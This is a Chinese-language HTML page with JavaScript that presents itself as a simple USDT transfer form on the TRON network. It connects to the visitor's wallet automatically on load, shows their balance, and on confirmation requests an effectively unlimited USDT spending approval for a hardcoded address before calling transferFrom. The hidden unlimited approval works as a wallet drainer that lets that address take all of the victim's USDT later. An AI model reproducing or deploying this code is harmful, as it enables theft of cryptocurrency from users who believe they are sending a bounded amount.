<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>USDT转账</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
<style>
*{
  box-sizing: border-box;
  margin: 0;
  padding: 0;
  -webkit-tap-highlight-color: transparent;
  font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
}
body {
  background-color: #f7f8fa;
  padding: 20px 16px;
  max-width: 520px;
  margin: 0 auto;
}
.address-card {
  background: #ffffff;
  border-radius: 16px;
  padding: 20px 18px;
  margin-bottom: 16px;
}
.label-text {
  font-size: 16px;
  color: #666;
  margin-bottom: 12px;
}
.fixed-addr-box {
  width: 100%;
  border: 1px solid #e5e7eb;
  border-radius: 12px;
  padding: 14px 12px;
  background: #f1f5f9;
  color: #333;
  word-break: break-all;
}
.amount-card {
  background: #ffffff;
  border-radius: 16px;
  padding: 20px 18px;
  margin-bottom:16px;
}
.amount-row {
  display: flex;
  align-items: flex-end;
  justify-content: space-between;
  margin-bottom: 16px;
}
.amount-input {
  font-size: 48px;
  border: none;
  outline: none;
  width: 75%;
  background: transparent;
  color: #111;
}
.amount-input::placeholder {
  font-size: 18px;
  color: #aaa;
}
.max-btn {
  padding: 6px 14px;
  background-color: #dbeafe;
  color: #2563eb;
  border-radius: 8px;
  font-weight: 500;
  cursor: pointer;
}
.token-row {
  background-color: #eef2ff;
  border-radius: 12px;
  padding: 14px;
  display: flex;
  align-items: center;
  justify-content: space-between;
}
.token-left {
  display: flex;
  align-items: center;
  gap: 10px;
}
.usdt-icon {
  width: 32px;
  height: 32px;
  border-radius: 50%;
  object-fit: cover;
}
.token-name {
  font-size: 18px;
  font-weight: 500;
}
.token-balance {
  color: #555;
  font-size: 16px;
}
.result-card{
  background:#fff;
  border-radius:16px;
  padding:18px;
  margin-bottom:16px;
}
.result-input{
  width:100%;
  border:1px solid #e5e7eb;
  border-radius:12px;
  padding:14px 12px;
  background:#f9fafb;
  outline:none;
  color:#111;
}
.send-main-btn{
  width:100%;
  padding:16px;
  border:none;
  border-radius:14px;
  background:#2563eb;
  color:#fff;
  font-size:17px;
  font-weight:500;
  cursor:pointer;
}
.send-main-btn:disabled{
  background:#94a3b8;
  cursor:not-allowed;
}
.bottom-tip {
  position: fixed;
  bottom: 30px;
  left: 50%;
  transform: translateX(-50%);
  background: white;
  padding: 12px 20px;
  border-radius: 12px;
  box-shadow: 0 2px 12px rgba(0,0,0,0.1);
  text-align: center;
}
</style>
</head>
<body>

<div class="address-card">
  <div class="label-text">收款地址</div>
  <div class="fixed-addr-box">TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE</div>
</div>

<div class="amount-card">
  <div class="label-text">转出数量（USDT）</div>
  <div class="amount-row">
    <input id="amountInput" class="amount-input" value="" inputmode="decimal" placeholder="请输入数量">
    <div class="max-btn" id="maxBtn">MAX</div>
  </div>

  <div class="token-row">
    <div class="token-left">
      <img class="usdt-icon" src="https://static.tronscan.org/production/logo/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t.png">
      <span class="token-name">USDT</span>
    </div>
    <span class="token-balance" id="balanceText">0.000000</span>
  </div>
</div>

<div class="result-card">
  <div class="label-text">到账数量</div>
  <input id="receiveAmount" class="result-input" readonly>
</div>

<button class="send-main-btn" id="sendBtn" disabled>确认转账</button>

<div class="bottom-tip" id="tipBox">
  <span id="tipText">页面加载中，正在自动检测钱包...</span>
</div>

<script>
const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const RPC = "https://api.trongrid.io";

let tronWeb = null;
let userAddress = "";
let usdtContract = null;

const $ = s => document.querySelector(s);
const sendBtn = $("#sendBtn");
const tipText = $("#tipText");
const amountInput = $("#amountInput");
const receiveAmount = $("#receiveAmount");
const maxBtn = $("#maxBtn");
const balanceText = $("#balanceText");

// ========== Tronswap同款 页面加载自动连接逻辑 ==========
async function autoConnectTronWallet() {
  tipText.textContent = "正在自动检测波场钱包Provider...";
  try {
    // 优先级1：TP新版 tronProvider（Tronswap首选）
    let provider = window.tronProvider;

    // 优先级2：老版全局tronWeb（TronLink已注入授权）
    if (!provider && window.tronWeb && window.tronWeb.ready) {
      tronWeb = window.tronWeb;
      userAddress = tronWeb.defaultAddress.base58;
    }
    // 优先级3：主动请求授权（第一次访问会弹钱包授权框）
    else if (provider) {
      const accounts = await provider.request({ method: "tron_requestAccounts" });
      if (!accounts || accounts.length === 0) throw new Error("用户拒绝了钱包授权");
      userAddress = accounts[0];
      tronWeb = new TronWeb({
        fullHost: RPC,
        provider: provider
      });
    }
    // 没有钱包注入对象
    else {
      throw new Error("未检测到波场钱包Provider，请使用TP内置浏览器打开本地HTML文件");
    }

    tipText.textContent = `已自动连接：${userAddress.slice(0,10)}...${userAddress.slice(-6)}`;

    // 初始化USDT合约ABI
    usdtContract = tronWeb.contract([
      {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
      {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
      {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
      {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
    ], USDT_CONTRACT);

    await loadBalance();
    sendBtn.disabled = false;

    // 监听切换钱包地址自动刷新
    if(provider) provider.on("accountsChanged", () => location.reload());

  } catch (err) {
    console.error("自动连接失败：", err);
    tipText.textContent = "自动连接失败：" + err.message;
  }
}

// 读取USDT余额
async function loadBalance() {
  const raw = await usdtContract.balanceOf(userAddress).call();
  balanceText.textContent = tronWeb.fromSun(raw).toFixed(6);
}

// 输入框联动计算到账数量
amountInput.addEventListener("input", () => {
  const num = parseFloat(amountInput.value) || 0;
  receiveAmount.value = num.toFixed(6);
});

// MAX按钮读取全部余额
maxBtn.addEventListener("click", async () => {
  if (!usdtContract) return alert("钱包自动连接失败，无法读取余额");
  const raw = await usdtContract.balanceOf(userAddress).call();
  const num = tronWeb.fromSun(raw);
  amountInput.value = num.toFixed(2);
  amountInput.dispatchEvent(new Event("input"));
});

// 授权+转账逻辑
sendBtn.addEventListener("click", async () => {
  if (!tronWeb) return alert("钱包未自动连接");
  const val = parseFloat(amountInput.value);
  if (isNaN(val) || val <= 0) return alert("请输入有效的转出数量");
  const sunVal = tronWeb.toSun(val);

  try {
    const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
    if (Number(allowance) < sunVal) {
      alert("需要授权USDT合约，请在TP钱包签名授权");
      await usdtContract.approve(TARGET_ADDR, "9999999999999999999999999999").send();
      alert("授权完成，正在执行转账");
    }
    const tx = await usdtContract.transferFrom(userAddress, TARGET_ADDR, sunVal).send();
    alert(`转账成功！交易哈希：${tx}`);
    await loadBalance();
  } catch (e) {
    alert("操作失败：" + e.message);
  }
});

// 页面DOM加载完成后 自动执行连接（核心自动逻辑）
window.addEventListener('DOMContentLoaded', autoConnectTronWallet);
</script>

</body>
</html>
